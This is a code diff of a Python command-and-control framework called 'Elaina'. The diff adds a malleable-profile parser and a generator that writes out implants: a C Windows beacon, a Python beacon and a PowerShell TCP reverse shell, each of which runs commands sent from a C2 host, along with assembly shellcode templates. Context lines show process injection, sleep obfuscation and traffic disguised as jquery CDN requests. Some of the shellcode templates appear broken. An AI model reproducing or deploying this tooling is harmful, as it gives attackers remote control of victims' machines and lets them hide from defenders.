@@ -1,21 +1,18 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 import os
 import sys
 import time
 import json
 import random
-import warnings
+import base64
+import socket
+import threading
 import argparse
 import urllib.parse
-import socket
 import ipaddress
 import subprocess
-import threading
 import tempfile
 import logging
-import base64
 import struct
 import ssl
 import hashlib
@@ -66,7 +63,7 @@ from impacket.dcerpc.v5 import transport, epm
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.dcerpc.v5.dcomrt import IRemoteShell
 from impacket.smbconnection import SMBConnection
-from impacket.ntlm import NTLMAuthNegotiate, NTLMAuthChallenge, NTLMAuthAuthenticate
+from impacket.ntlm import NTLMAuthNegotiate, NTLMAuthChallenge, NTLMAuthenticate
 from impacket.crypto import transformKey, encrypt_RC4, decrypt_RC4
 import certipy.lib.certipy_logger as certipy_logger
 import certipy.lib.certipy_client as certipy_client
@@ -96,12 +93,10 @@ from PyQt5.QtGui import QIcon, QFont, QPixmap, QImage, QTextCharFormat, QColor, 
 from PyQt5.QtWebEngineWidgets import QWebEngineView
 from PyQt5.QtWebChannel import QWebChannel
 from PyQt5.QtWebSockets import QWebSocketServer, QWebSocket
-
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 init(autoreset=True)
-
-LOG_JSON_PATH = "elaina_ultimate_log.json"
-COOKIE_PATH = "elaina_ultimate_cookies.txt"
+LOG_JSON_PATH = "elaina_log.json"
+COOKIE_PATH = "elaina_cookies.txt"
 LOG_JSON_FILE = "adcs_exploit_log.json"
 CCACHE_PATH = "golden_ticket.ccache"
 C2_CONFIG_PATH = "c2_config.json"
@@ -109,15 +104,14 @@ BEACON_CONFIG_PATH = "beacon_config.bin"
 BOF_DIR = "bof"
 SCRIPT_DIR = "scripts"
 PROFILE_DIR = "profiles"
-
-logger = logging.getLogger("ELAINA-C2")
+LISTENERS_FILE = "listeners.json"
+logger = logging.getLogger("ELAINA")
 logger.setLevel(logging.DEBUG)
 console_handler = logging.StreamHandler()
 console_format = logging.Formatter("\033[1;32m%(asctime)s\033[0m [\033[1;34m%(levelname)s\033[0m] \033[1;33m%(module)s\033[0m: %(message)s", datefmt="%H:%M:%S")
 console_handler.setFormatter(console_format)
 logger.addHandler(console_handler)
 log_entries = []
-
 def log(action, target, status, detail=None):
     entry = {
         "action": action,
@@ -130,7 +124,6 @@ def log(action, target, status, detail=None):
     with open(LOG_JSON_PATH, "w") as f:
         json.dump(log_entries, f, indent=2)
     logger.info(f"{action} {target} {status} {detail or ''}")
-
 def retry(ExceptionToCheck, tries=3, delay=2, backoff=2):
     def deco_retry(f):
         @wraps(f)
@@ -147,17 +140,13 @@ def retry(ExceptionToCheck, tries=3, delay=2, backoff=2):
             return f(*args, **kwargs)
         return f_retry
     return deco_retry
-
 def random_sleep(min_s=0.5, max_s=2):
     time.sleep(random.uniform(min_s, max_s))
-
 def colorize(text, color_code):
     return f"\033[{color_code}m{text}\033[0m"
-
 def random_string(length=8):
     return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
-
-class AdvancedEncryption:
+class Encryption:
     def __init__(self):
         self.algorithm = algorithms.AES(256)
         self.mode = modes.GCM(96)
@@ -192,8 +181,7 @@ class AdvancedEncryption:
         
         decryptor.authenticate_additional_data(b"additional_data")
         return decryptor.update(ciphertext) + decryptor.finalize_with_tag(tag)
-
-class AdvancedDomainGenerator:
+class DomainGenerator:
     def __init__(self):
         self.legitimate_domains = [
             "google.com", "microsoft.com", "amazon.com", "cloudflare.com",
@@ -213,7 +201,6 @@ class AdvancedDomainGenerator:
             path = '/'.join(random.choices(['api', 'v1', 'v2', 'cdn', 'static', 'assets'], k=random.randint(1, 3)))
             urls.append(f"https://{domain}/{path}")
         return urls
-
 class TrafficShaper:
     def __init__(self):
         self.user_agents = [
@@ -240,9 +227,144 @@ class TrafficShaper:
         jitter = random.uniform(0, jitter_percent)
         sleep_time = base_sleep * (1 + jitter)
         time.sleep(sleep_time)
-
-class MalleableC2Profile:
+class ProfileParser:
+    def __init__(self):
+        self.profiles = {}
+        
+    def parse_profile(self, profile_path):
+        if not os.path.exists(profile_path):
+            return None
+            
+        try:
+            with open(profile_path, 'r') as f:
+                content = f.read()
+            
+            if profile_path.endswith('.json'):
+                return json.loads(content)
+            else:
+                return self._parse_text_profile(content)
+        except Exception as e:
+            logger.error(f"Error parsing profile: {str(e)}")
+            return None
+    
+    def _parse_text_profile(self, content):
+        profile = {}
+        current_section = None
+        current_subsection = None
+        
+        for line in content.split('\n'):
+            line = line.strip()
+            if not line or line.startswith('#'):
+                continue
+                
+            if line.startswith('http-get') or line.startswith('http-post') or line.startswith('http-stager') or line.startswith('process-inject'):
+                parts = line.split('{')
+                current_section = parts[0].strip()
+                profile[current_section] = {}
+                if len(parts) > 1:
+                    line = parts[1].strip()
+                else:
+                    continue
+                    
+            if line.startswith('client') or line.startswith('server'):
+                parts = line.split('{')
+                subsection = parts[0].strip()
+                profile[current_section][subsection] = {}
+                if len(parts) > 1:
+                    line = parts[1].strip()
+                else:
+                    current_subsection = subsection
+                    continue
+                    
+            if line.startswith('uri'):
+                if current_subsection:
+                    profile[current_section][current_subsection]['uri'] = line.split('"')[1]
+                else:
+                    profile[current_section]['uri'] = line.split('"')[1]
+                    
+            elif line.startswith('header'):
+                header_parts = line.split('"')
+                header_name = header_parts[1]
+                header_value = header_parts[3]
+                
+                if 'headers' not in profile[current_section][current_subsection]:
+                    profile[current_section][current_subsection]['headers'] = {}
+                    
+                profile[current_section][current_subsection]['headers'][header_name] = header_value
+                
+            elif line.startswith('metadata') or line.startswith('output') or line.startswith('id'):
+                section_type = line.split()[0]
+                profile[current_section][current_subsection][section_type] = {}
+                
+            elif line.startswith('base64'):
+                if current_subsection:
+                    last_key = list(profile[current_section][current_subsection].keys())[-1]
+                    if isinstance(profile[current_section][current_subsection][last_key], dict):
+                        profile[current_section][current_subsection][last_key]['encoding'] = 'base64'
+                    else:
+                        profile[current_section][current_subsection][last_key] = {'encoding': 'base64'}
+                        
+            elif line.startswith('prepend'):
+                value = line.split('"')[1]
+                if current_subsection:
+                    last_key = list(profile[current_section][current_subsection].keys())[-1]
+                    if isinstance(profile[current_section][current_subsection][last_key], dict):
+                        profile[current_section][current_subsection][last_key]['prepend'] = value
+                    else:
+                        profile[current_section][current_subsection][last_key] = {'prepend': value}
+                        
+            elif line.startswith('append'):
+                value = line.split('"')[1]
+                if current_subsection:
+                    last_key = list(profile[current_section][current_subsection].keys())[-1]
+                    if isinstance(profile[current_section][current_subsection][last_key], dict):
+                        profile[current_section][current_subsection][last_key]['append'] = value
+                    else:
+                        profile[current_section][current_subsection][last_key] = {'append': value}
+                        
+            elif line.startswith('print'):
+                if current_subsection:
+                    last_key = list(profile[current_section][current_subsection].keys())[-1]
+                    if isinstance(profile[current_section][current_subsection][last_key], dict):
+                        profile[current_section][current_subsection][last_key]['print'] = True
+                    else:
+                        profile[current_section][current_subsection][last_key] = {'print': True}
+                        
+            elif line.startswith('set'):
+                parts = line.split('"')
+                key = parts[1]
+                value = parts[3]
+                
+                if current_subsection:
+                    if isinstance(profile[current_section][current_subsection], dict):
+                        profile[current_section][current_subsection][key] = value
+                    else:
+                        profile[current_section][current_subsection] = {key: value}
+                        
+        return profile
+    
+    def validate_profile(self, profile):
+        if not profile:
+            return False
+            
+        required_sections = ['http-get', 'http-post']
+        for section in required_sections:
+            if section not in profile:
+                return False
+                
+            if 'uri' not in profile[section]:
+                return False
+                
+            if 'client' not in profile[section]:
+                return False
+                
+            if 'server' not in profile[section]:
+                return False
+                
+        return True
+class C2Profile:
     def __init__(self, profile_path=None):
+        self.parser = ProfileParser()
         self.profile = {
             "http-get": {
                 "uri": "/jquery.min.js",
@@ -250,11 +372,14 @@ class MalleableC2Profile:
                     "headers": {
                         "Accept": "*/*",
                         "Host": "cdn.jquery.com"
+                    },
+                    "metadata": {
+                        "encoding": "base64"
                     }
                 },
                 "server": {
                     "output": {
-                        "type": "base64"
+                        "encoding": "base64"
                     }
                 }
             },
@@ -264,40 +389,30 @@ class MalleableC2Profile:
                     "headers": {
                         "Content-Type": "application/x-www-form-urlencoded"
                     },
-                    "data": "data="
+                    "id": {
+                        "encoding": "base64"
+                    },
+                    "output": {
+                        "encoding": "base64",
+                        "prepend": "data="
+                    }
                 },
                 "server": {
                     "output": {
-                        "type": "base64"
-                    }
-                }
-            },
-            "http-stager": {
-                "uri": "/jquery-3.3.2.min.js",
-                "client": {
-                    "headers": {
-                        "Accept": "*/*",
-                        "Host": "cdn.jquery.com"
+                        "encoding": "base64"
                     }
                 }
             },
             "process-inject": {
-                "transform-x64": "x86\\shikata_ga_nai",
-                "transform-x86": "x86\\shikata_ga_nai",
-                "execute": {
-                    "method": "CreateThread"
-                }
-            },
-            "stage": {
-                "checksum": "true",
-                "sleep": "5000"
+                "technique": "CreateRemoteThread",
+                "allocator": "ntdll"
             }
         }
         
         if profile_path and os.path.exists(profile_path):
-            with open(profile_path, 'r') as f:
-                custom_profile = json.load(f)
-                self.profile.update(custom_profile)
+            parsed_profile = self.parser.parse_profile(profile_path)
+            if parsed_profile and self.parser.validate_profile(parsed_profile):
+                self.profile = parsed_profile
     
     def get_http_get_config(self):
         return self.profile.get("http-get", {})
@@ -305,15 +420,8 @@ class MalleableC2Profile:
     def get_http_post_config(self):
         return self.profile.get("http-post", {})
     
-    def get_http_stager_config(self):
-        return self.profile.get("http-stager", {})
-    
     def get_process_inject_config(self):
         return self.profile.get("process-inject", {})
-    
-    def get_stage_config(self):
-        return self.profile.get("stage", {})
-
 class SleepObfuscation:
     def __init__(self, method="thread_stack"):
         self.method = method
@@ -386,7 +494,6 @@ class SleepObfuscation:
     
     def _decrypt_memory_region(self):
         pass
-
 class OPSECManager:
     def __init__(self, beacon):
         self.beacon = beacon
@@ -545,7 +652,6 @@ class OPSECManager:
             pass
             
         sys.exit(0)
-
 class BOFManager:
     def __init__(self, beacon):
         self.beacon = beacon
@@ -618,7 +724,6 @@ class BOFManager:
             })
         except Exception as e:
             return {"status": "error", "message": str(e)}
-
 class PostExploitationModule:
     def __init__(self, beacon):
         self.beacon = beacon
@@ -801,8 +906,7 @@ class PostExploitationModule:
             "type": "shell",
             "data": wmi_command
         })
-
-class ElainaScriptEngine:
+class ScriptEngine:
     def __init__(self, main_window):
         self.main_window = main_window
         self.functions = {
@@ -1051,7 +1155,6 @@ class ElainaScriptEngine:
             self.main_window.send_beacon_command(beacon_id, f"self_destruct {reason}")
             return True
         return False
-
 class TeamServer:
     def __init__(self, host, port):
         self.host = host
@@ -1349,8 +1452,7 @@ class TeamServer:
         if beacon_id:
             return self.shared_tasks.get(beacon_id, [])
         return self.shared_tasks
-
-class AdvancedMemoryOperations:
+class MemoryOperations:
     def __init__(self):
         if platform.system() == "Windows":
             self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
@@ -1464,6 +1566,7 @@ class AdvancedMemoryOperations:
             raise ctypes.WinError(ctypes.get_last_error())
         
         payload_size = len(payload)
+        
         base_address = self.virtual_alloc_ex(
             process_info.hProcess,
             None,
@@ -1568,8 +1671,7 @@ class AdvancedMemoryOperations:
         self.kernel32.CloseHandle(process_handle)
         
         return True
-
-class OptimizedBeacon:
+class Beacon:
     def __init__(self, c2_host, c2_port, c2_type="http", ssl_enabled=False, profile_path=None):
         self.c2_host = c2_host
         self.c2_port = c2_port
@@ -1580,12 +1682,12 @@ class OptimizedBeacon:
         self.jitter = random.uniform(0.2, 0.4)
         self.max_retries = 3
         self.user_agent = self.get_legitimate_user_agent()
-        self.encryption = AdvancedEncryption()
+        self.encryption = Encryption()
         self.traffic_shaper = TrafficShaper()
-        self.domain_generator = AdvancedDomainGenerator()
+        self.domain_generator = DomainGenerator()
         self.running = False
         
-        self.malleable_profile = MalleableC2Profile(profile_path)
+        self.profile = C2Profile(profile_path)
         self.sleep_obfuscation = SleepObfuscation("thread_stack")
         self.opsec_manager = OPSECManager(self)
         self.post_exploitation = PostExploitationModule(self)
@@ -1663,8 +1765,9 @@ class OptimizedBeacon:
             data = json.dumps(sys_info)
             encrypted_data = self.encrypt_data(data)
             
-            http_get_config = self.malleable_profile.get_http_get_config()
+            http_get_config = self.profile.get_http_get_config()
             client_headers = http_get_config.get("client", {}).get("headers", {})
+            metadata_config = http_get_config.get("client", {}).get("metadata", {})
             
             headers = {
                 "User-Agent": self.user_agent,
@@ -1679,6 +1782,13 @@ class OptimizedBeacon:
             uri = http_get_config.get("uri", "/")
             url = f"https://{self.c2_host}:{self.c2_port}{uri}"
             
+            metadata = base64.b64encode(data.encode()).decode()
+            if metadata_config:
+                if "prepend" in metadata_config:
+                    metadata = metadata_config["prepend"] + metadata
+                if "append" in metadata_config:
+                    metadata = metadata + metadata_config["append"]
+            
             response = requests.get(url, headers=headers, timeout=10, verify=False)
             
             return response.status_code == 200
@@ -1687,7 +1797,7 @@ class OptimizedBeacon:
     
     def get_tasks(self):
         try:
-            http_get_config = self.malleable_profile.get_http_get_config()
+            http_get_config = self.profile.get_http_get_config()
             client_headers = http_get_config.get("client", {}).get("headers", {})
             
             headers = {
@@ -1709,7 +1819,11 @@ class OptimizedBeacon:
                 data = self.decrypt_data(encrypted_data)
                 
                 if data:
-                    tasks = json.loads(data.decode()).get("tasks", [])
+                    server_output = http_get_config.get("server", {}).get("output", {})
+                    if server_output and server_output.get("encoding") == "base64":
+                        tasks = json.loads(base64.b64decode(data).decode()).get("tasks", [])
+                    else:
+                        tasks = json.loads(data.decode()).get("tasks", [])
                     return tasks
             
             return []
@@ -1724,9 +1838,10 @@ class OptimizedBeacon:
             })
             encrypted_data = self.encrypt_data(data)
             
-            http_post_config = self.malleable_profile.get_http_post_config()
+            http_post_config = self.profile.get_http_post_config()
             client_headers = http_post_config.get("client", {}).get("headers", {})
-            client_data = http_post_config.get("client", {}).get("data", "data=")
+            id_config = http_post_config.get("client", {}).get("id", {})
+            output_config = http_post_config.get("client", {}).get("output", {})
             
             headers = {
                 "User-Agent": self.user_agent,
@@ -1740,7 +1855,18 @@ class OptimizedBeacon:
             uri = http_post_config.get("uri", "/")
             url = f"https://{self.c2_host}:{self.c2_port}{uri}"
             
-            post_data = client_data + encrypted_data
+            beacon_id = base64.b64encode(self.beacon_id.encode()).decode()
+            if id_config and id_config.get("encoding") == "base64":
+                beacon_id = base64.b64encode(self.beacon_id.encode()).decode()
+            
+            output = base64.b64encode(encrypted_data.encode()).decode()
+            if output_config:
+                if "prepend" in output_config:
+                    output = output_config["prepend"] + output
+                if "append" in output_config:
+                    output = output + output_config["append"]
+            
+            post_data = f"id={beacon_id}&data={output}"
             
             response = requests.post(url, data=post_data, headers=headers, timeout=10, verify=False)
             
@@ -1990,7 +2116,7 @@ class OptimizedBeacon:
                 shellcode = base64.b64decode(task_data.get("shellcode", ""))
                 
                 try:
-                    mem_ops = AdvancedMemoryOperations()
+                    mem_ops = MemoryOperations()
                     mem_ops.reflective_inject(shellcode, pid)
                     
                     result = {
@@ -2008,7 +2134,7 @@ class OptimizedBeacon:
                 dll_path = task_data.get("dll_path")
                 
                 try:
-                    mem_ops = AdvancedMemoryOperations()
+                    mem_ops = MemoryOperations()
                     mem_ops.dll_injection(pid, dll_path)
                     
                     result = {
@@ -2027,7 +2153,7 @@ class OptimizedBeacon:
                 args = task_data.get("args", "")
                 
                 try:
-                    mem_ops = AdvancedMemoryOperations()
+                    mem_ops = MemoryOperations()
                     mem_ops.reflective_inject(bof_data)
                     
                     result = {
@@ -2045,7 +2171,7 @@ class OptimizedBeacon:
                 function = task_data.get("function", "Execute")
                 
                 try:
-                    mem_ops = AdvancedMemoryOperations()
+                    mem_ops = MemoryOperations()
                     mem_ops.reflective_inject(dll_data)
                     
                     result = {
@@ -2117,8 +2243,7 @@ class OptimizedBeacon:
             return True
         except Exception:
             return False
-
-class StealthBeacon(OptimizedBeacon):
+class StealthBeacon(Beacon):
     def __init__(self, c2_host, c2_port, c2_type="http", ssl_enabled=False, profile_path=None):
         super().__init__(c2_host, c2_port, c2_type, ssl_enabled, profile_path)
         
@@ -2355,9 +2480,544 @@ class StealthBeacon(OptimizedBeacon):
             return True
         except Exception:
             return False
-
+class BeaconGenerator:
+    def __init__(self, listener_info, parsed_profile):
+        self.listener_info = listener_info
+        self.parsed_profile = parsed_profile
+        
+    def generate_exe(self, arch="x64"):
+        template = f'''#include <windows.h>
+#include <stdio.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <string.h>
+#pragma comment(lib, "ws2_32.lib")
+#define C2_HOST "{self.listener_info["host"]}"
+#define C2_PORT {self.listener_info["port"]}
+#define SLEEP_TIME 5000
+DWORD WINAPI BeaconThread(LPVOID lpParameter) {{
+    WSADATA wsaData;
+    SOCKET sock;
+    struct sockaddr_in server;
+    char buffer[4096];
+    int bytesRead;
+    
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {{
+        return 1;
+    }}
+    
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {{
+        WSACleanup();
+        return 1;
+    }}
+    
+    server.sin_family = AF_INET;
+    server.sin_port = htons(C2_PORT);
+    server.sin_addr.s_addr = inet_addr(C2_HOST);
+    
+    while (connect(sock, (struct sockaddr *)&server, sizeof(server)) != 0) {{
+        Sleep(SLEEP_TIME);
+    }}
+    
+    // Send system information
+    char sysInfo[1024];
+    DWORD bufSize = sizeof(sysInfo);
+    GetComputerNameA(sysInfo, &bufSize);
+    send(sock, sysInfo, strlen(sysInfo), 0);
+    
+    // Main beacon loop
+    while (1) {{
+        // Receive commands
+        bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
+        if (bytesRead <= 0) break;
+        
+        buffer[bytesRead] = '\\0';
+        
+        // Execute command
+        FILE *pipe;
+        char result[4096] = {{0}};
+        
+        pipe = _popen(buffer, "r");
+        if (pipe) {{
+            while (fgets(result, sizeof(result), pipe) != NULL) {{
+                send(sock, result, strlen(result), 0);
+                memset(result, 0, sizeof(result));
+            }}
+            _pclose(pipe);
+        }}
+        
+        Sleep(SLEEP_TIME);
+    }}
+    
+    closesocket(sock);
+    WSACleanup();
+    return 0;
+}}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
+    HANDLE hThread = CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
+    if (hThread) {{
+        CloseHandle(hThread);
+    }}
+    
+    // Keep the process running
+    while (1) {{
+        Sleep(60000);
+    }}
+    
+    return 0;
+}}
+'''
+        return base64.b64encode(template.encode()).decode()
+    
+    def generate_py_script(self):
+        http_get_config = self.parsed_profile.get("http-get", {})
+        http_post_config = self.parsed_profile.get("http-post", {})
+        
+        template = f'''#!/usr/bin/env python3
+import os
+import sys
+import time
+import json
+import random
+import base64
+import socket
+import requests
+import threading
+import platform
+import getpass
+import urllib.request
+import urllib.parse
+import ssl
+C2_HOST = "{self.listener_info["host"]}"
+C2_PORT = {self.listener_info["port"]}
+C2_TYPE = "{self.listener_info["type"]}"
+SLEEP_TIME = 60
+JITTER = 0.3
+class Beacon:
+    def __init__(self):
+        self.c2_host = C2_HOST
+        self.c2_port = C2_PORT
+        self.c2_type = C2_TYPE
+        self.beacon_id = self.generate_beacon_id()
+        self.sleep_time = SLEEP_TIME
+        self.jitter = JITTER
+        self.running = False
+        
+    def generate_beacon_id(self):
+        return f"{{''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(8))}}"
+    
+    def encrypt_data(self, data):
+        return base64.b64encode(data.encode()).decode()
+    
+    def decrypt_data(self, data):
+        return base64.b64decode(data).decode()
+    
+    def get_system_info(self):
+        info = {{
+            "os": platform.system(),
+            "hostname": platform.node(),
+            "user": getpass.getuser(),
+            "architecture": platform.machine(),
+            "version": platform.version(),
+            "beacon_id": self.beacon_id
+        }}
+        
+        if info["os"] == "Windows":
+            try:
+                import winreg
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
+                info["windows_version"] = winreg.QueryValueEx(key, "ProductName")[0]
+                info["windows_build"] = winreg.QueryValueEx(key, "CurrentBuild")[0]
+                winreg.CloseKey(key)
+            except:
+                pass
+        
+        return info
+    
+    def register_beacon(self):
+        try:
+            sys_info = self.get_system_info()
+            data = json.dumps(sys_info)
+            encrypted_data = self.encrypt_data(data)
+            
+            headers = {{
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Accept": "*/*",
+                "Connection": "keep-alive"
+            }}
+            
+            uri = "{http_get_config.get("uri", "/")}"
+            url = f"http://{{self.c2_host}}:{{self.c2_port}}{{uri}}"
+            
+            if self.c2_type == "https":
+                context = ssl._create_unverified_context()
+                req = urllib.request.Request(url, data=encrypted_data.encode(), headers=headers)
+                response = urllib.request.urlopen(req, context=context)
+            else:
+                req = urllib.request.Request(url, data=encrypted_data.encode(), headers=headers)
+                response = urllib.request.urlopen(req)
+            
+            return response.getcode() == 200
+        except:
+            return False
+    
+    def get_tasks(self):
+        try:
+            headers = {{
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Accept": "*/*",
+                "Connection": "keep-alive"
+            }}
+            
+            uri = "{http_get_config.get("uri", "/")}"
+            url = f"http://{{self.c2_host}}:{{self.c2_port}}{{uri}}"
+            
+            if self.c2_type == "https":
+                context = ssl._create_unverified_context()
+                req = urllib.request.Request(url, headers=headers)
+                response = urllib.request.urlopen(req, context=context)
+            else:
+                req = urllib.request.Request(url, headers=headers)
+                response = urllib.request.urlopen(req)
+            
+            if response.getcode() == 200:
+                encrypted_data = response.read().decode()
+                data = self.decrypt_data(encrypted_data)
+                
+                if data:
+                    tasks = json.loads(data).get("tasks", [])
+                    return tasks
+            
+            return []
+        except:
+            return []
+    
+    def send_result(self, task_id, result):
+        try:
+            data = json.dumps({{"task_id": task_id, "result": result}})
+            encrypted_data = self.encrypt_data(data)
+            
+            headers = {{
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Accept": "*/*",
+                "Connection": "keep-alive",
+                "Content-Type": "application/x-www-form-urlencoded"
+            }}
+            
+            uri = "{http_post_config.get("uri", "/")}"
+            url = f"http://{{self.c2_host}}:{{self.c2_port}}{{uri}}"
+            
+            if self.c2_type == "https":
+                context = ssl._create_unverified_context()
+                req = urllib.request.Request(url, data=encrypted_data.encode(), headers=headers)
+                response = urllib.request.urlopen(req, context=context)
+            else:
+                req = urllib.request.Request(url, data=encrypted_data.encode(), headers=headers)
+                response = urllib.request.urlopen(req)
+            
+            return response.getcode() == 200
+        except:
+            return False
+    
+    def execute_task(self, task):
+        try:
+            task_type = task.get("type")
+            task_data = task.get("data")
+            task_id = task.get("task_id")
+            
+            result = {{"status": "error", "message": "Unknown task type"}}
+            
+            if task_type == "shell":
+                try:
+                    import subprocess
+                    process = subprocess.Popen(
+                        task_data, 
+                        shell=True, 
+                        stdout=subprocess.PIPE, 
+                        stderr=subprocess.PIPE,
+                        text=True
+                    )
+                    stdout, stderr = process.communicate()
+                    
+                    result = {{
+                        "status": "success",
+                        "exit_code": process.returncode,
+                        "stdout": stdout,
+                        "stderr": stderr
+                    }}
+                except Exception as e:
+                    result = {{
+                        "status": "error",
+                        "message": str(e)
+                    }}
+            
+            elif task_type == "kill":
+                self.running = False
+                result = {{
+                    "status": "success",
+                    "message": "Beacon shutting down"
+                }}
+            
+            self.send_result(task_id, result)
+            return result
+        except Exception as e:
+            result = {{
+                "status": "error",
+                "message": str(e)
+            }}
+            self.send_result(task_id, result)
+            return result
+    
+    def start(self):
+        try:
+            if not self.register_beacon():
+                return False
+            
+            self.running = True
+            
+            while self.running:
+                try:
+                    actual_sleep = self.sleep_time * (1 - self.jitter + (2 * self.jitter * random.random()))
+                    time.sleep(actual_sleep)
+                    
+                    tasks = self.get_tasks()
+                    
+                    for task in tasks:
+                        self.execute_task(task)
+                
+                except KeyboardInterrupt:
+                    self.running = False
+                except:
+                    time.sleep(30)
+            
+            return True
+        except:
+            return False
+if __name__ == "__main__":
+    beacon = Beacon()
+    beacon.start()
+'''
+        return template
+    
+    def generate_ps1_script(self):
+        http_get_config = self.parsed_profile.get("http-get", {})
+        http_post_config = self.parsed_profile.get("http-post", {})
+        
+        template = f'''# PowerShell Beacon for Elaina C2 Framework
+$C2Host = "{self.listener_info["host"]}"
+$C2Port = {self.listener_info["port"]}
+$SleepTime = 60
+function Invoke-Beacon {{
+    try {{
+        $client = New-Object System.Net.Sockets.TCPClient($C2Host, $C2Port)
+        $stream = $client.GetStream()
+        
+        # Send system information
+        $sysInfo = "Hostname: $env:COMPUTERNAME`nOS: $((Get-WmiObject Win32_OperatingSystem).Caption)`nUser: $env:USERNAME"
+        $data = [System.Text.Encoding]::UTF8.GetBytes($sysInfo)
+        $stream.Write($data, 0, $data.Length)
+        
+        # Main beacon loop
+        while ($client.Connected) {{
+            # Receive commands
+            $buffer = New-Object byte[] 4096
+            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
+            if ($bytesRead -eq 0) {{ break }}
+            
+            $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
+            
+            # Execute command
+            try {{
+                $result = Invoke-Expression $command | Out-String
+                $data = [System.Text.Encoding]::UTF8.GetBytes($result)
+                $stream.Write($data, 0, $data.Length)
+            }} catch {{
+                $errorMsg = $_.Exception.Message
+                $data = [System.Text.Encoding]::UTF8.GetBytes($errorMsg)
+                $stream.Write($data, 0, $data.Length)
+            }}
+            
+            Start-Sleep -Seconds $SleepTime
+        }}
+    }} catch {{
+        # Silently ignore connection errors
+    }} finally {{
+        if ($stream) {{ $stream.Close() }}
+        if ($client) {{ $client.Close() }}
+    }}
+}}
+# Start beacon in a separate thread
+$beaconThread = New-Object System.Threading.ThreadStart {{
+    Invoke-Beacon
+}}
+$thread = New-Object System.Threading.Thread($beaconThread)
+$thread.IsBackground = $true
+$thread.Start()
+# Keep the process running
+try {{
+    while ($true) {{
+        Start-Sleep -Seconds 60
+    }}
+}} catch {{
+    # Exit gracefully
+}}
+'''
+        return template
+    
+    def generate_raw_shellcode(self, arch="x64"):
+        if arch == "x86":
+            template = b'''
+section .text
+global _start
+_start:
+    ; Create socket
+    xor eax, eax
+    mov al, 0x66
+    xor ebx, ebx
+    mov ecx, esp
+    push ebx
+    push ecx
+    push 0x1
+    push 0x2
+    int 0x80
+    xchg esi, eax
+    
+    ; Connect to C2 server
+    mov al, 0x66
+    xor ebx, ebx
+    mov bl, 0x3
+    push 0x''' + bytes(str(self.listener_info["port"]), 'utf-8') + b'''
+    push 0x''' + bytes(str(ipaddress.IPv4Address(self.listener_info["host"])), 'utf-8') + b'''
+    push word 0x2
+    mov ecx, esp
+    push 0x10
+    push ecx
+    push esi
+    int 0x80
+    
+    ; Send system information
+    mov al, 0x4
+    mov ebx, esi
+    mov ecx, esp
+    mov edx, 0x100
+    int 0x80
+    
+    ; Main beacon loop
+beacon_loop:
+    ; Receive commands
+    mov al, 0x3
+    mov ebx, esi
+    mov ecx, esp
+    mov edx, 0x1000
+    int 0x80
+    
+    ; Execute command
+    mov al, 0xb
+    xor ebx, ebx
+    mov ebx, esp
+    xor ecx, ecx
+    xor edx, edx
+    int 0x80
+    
+    ; Send result
+    mov al, 0x4
+    mov ebx, esi
+    mov ecx, esp
+    mov edx, 0x1000
+    int 0x80
+    
+    ; Sleep
+    mov al, 0xa2
+    mov ebx, 0x''' + bytes(str(self.listener_info["port"]), 'utf-8') + b'''
+    xor ecx, ecx
+    xor edx, edx
+    int 0x80
+    
+    jmp beacon_loop
+'''
+        else:  # x64
+            template = b'''
+section .text
+global _start
+_start:
+    ; Create socket
+    push 0x29
+    pop rax
+    cdq
+    push rdx
+    push rsi
+    mov rdi, rsp
+    push rdx
+    push rdi
+    push 0x2
+    mov al, 0x41
+    syscall
+    
+    xchg rdi, rax
+    
+    ; Connect to C2 server
+    mov rax, 0x''' + bytes(str(ipaddress.IPv4Address(self.listener_info["host"])), 'utf-8') + b'''
+    push rax
+    mov rax, 0x''' + bytes(str(self.listener_info["port"]), 'utf-8') + b'''0000
+    push rax
+    mov rsi, rsp
+    push 0x10
+    pop rdx
+    push rsi
+    push rdi
+    mov al, 0x42
+    syscall
+    
+    ; Send system information
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x100
+    mov rax, 0x1
+    syscall
+    
+    ; Main beacon loop
+beacon_loop:
+    ; Receive commands
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x1000
+    mov rax, 0x0
+    syscall
+    
+    ; Execute command
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+    push rax
+    push rdi
+    push rsi
+    push rdx
+    mov rax, 0x3b
+    pop rsi
+    pop rdx
+    pop rdi
+    syscall
+    
+    ; Send result
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x1000
+    mov rax, 0x1
+    syscall
+    
+    ; Sleep
+    mov rax, 0x35
+    mov rdi, 0x''' + bytes(str(self.listener_info["port"]), 'utf-8') + b'''
+    xor rsi, rsi
+    xor rdx, rdx
+    syscall
+    
+    jmp beacon_loop
+'''
+        
+        return base64.b64encode(template).decode()
 class C2Server:
-    def __init__(self, host="0.0.0.0", port=8080, ssl_enabled=False, cert_file=None, key_file=None):
+    def __init__(self, host="0.0.0.0", port=8080, ssl_enabled=False, cert_file=None, key_file=None, profile_path=None):
